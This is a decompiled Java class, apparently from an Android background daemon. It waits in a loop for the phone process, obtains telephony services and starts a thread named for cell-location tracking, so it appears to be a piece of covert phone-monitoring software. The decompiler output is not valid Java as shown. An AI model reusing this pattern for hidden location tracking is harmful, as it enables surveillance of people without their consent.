package com.fx.daemon.util;

import android.content.Context;
import android.os.ConditionVariable;
import android.os.Looper;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import com.fx.daemon.b;
import com.vvt.ak.a;
import com.vvt.shell.ShellUtil;
import java.util.Timer;
import java.util.TimerTask;

public class e
  extends Thread
{
  private static final boolean a = a.a;
  private String b;
  private ConditionVariable c;
  private Looper d;
  private TelephonyManager e;
  private Timer f;
  private TimerTask g;
  
  public e(String paramString, ConditionVariable paramConditionVariable)
  {
    this.b = paramString;
    this.c = paramConditionVariable;
  }
  
  private void a(Context paramContext)
  {
    if (paramContext == null) {}
    for (;;)
    {
      return;
      d();
      Object localObject = (TelephonyManager)paramContext.getSystemService("phone");
      this.e = ((TelephonyManager)localObject);
      localObject = new com/fx/daemon/util/f;
      String str = "MCellLocationThread";
      ((f)localObject).<init>(this, str);
      ((Thread)localObject).start();
    }
  }
  
  private void c()
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    String str = null;
    for (;;)
    {
      if (!bool1)
      {
        str = "com.android.phone";
        bool1 = ShellUtil.a(str);
        boolean bool2 = a;
        if ((bool2) && (!bool1)) {}
      }
      else
      {
        bool1 = a;
        if (bool1) {}
        return;
      }
      long l = 3000L;
      SystemClock.sleep(l);
    }
  }
  
  private void d()
  {
    e();
    Object localObject = new com/fx/daemon/util/g;
    ((g)localObject).<init>(this);
    this.g = ((TimerTask)localObject);
    localObject = new java/util/Timer;
    ((Timer)localObject).<init>();
    this.f = ((Timer)localObject);
    localObject = this.f;
    TimerTask localTimerTask = this.g;
    long l = 15000L;
    ((Timer)localObject).schedule(localTimerTask, l);
    boolean bool = a;
    if (bool) {}
  }
  
  private void e()
  {
    Object localObject = this.g;
    if (localObject != null)
    {
      localObject = this.g;
      ((TimerTask)localObject).cancel();
      this.g = null;
    }
    localObject = this.f;
    if (localObject != null)
    {
      localObject = this.f;
      ((Timer)localObject).cancel();
      this.f = null;
      boolean bool = a;
      if (!bool) {}
    }
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
    Looper localLooper = this.d;
    if (localLooper != null)
    {
      localLooper = this.d;
      localLooper.quit();
      bool = a;
      if (!bool) {}
    }
    bool = a;
    if (bool) {}
  }
  
  public void run()
  {
    boolean bool1 = a;
    if (bool1) {}
    Looper.prepare();
    Object localObject = Looper.myLooper();
    this.d = ((Looper)localObject);
    bool1 = a;
    if (bool1) {}
    c();
    bool1 = a;
    if (bool1) {}
    localObject = b.b();
    boolean bool2 = a;
    if (bool2) {}
    a((Context)localObject);
    bool1 = a;
    if (bool1) {}
    Looper.loop();
    bool1 = a;
    if (bool1) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/fx/daemon/util/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */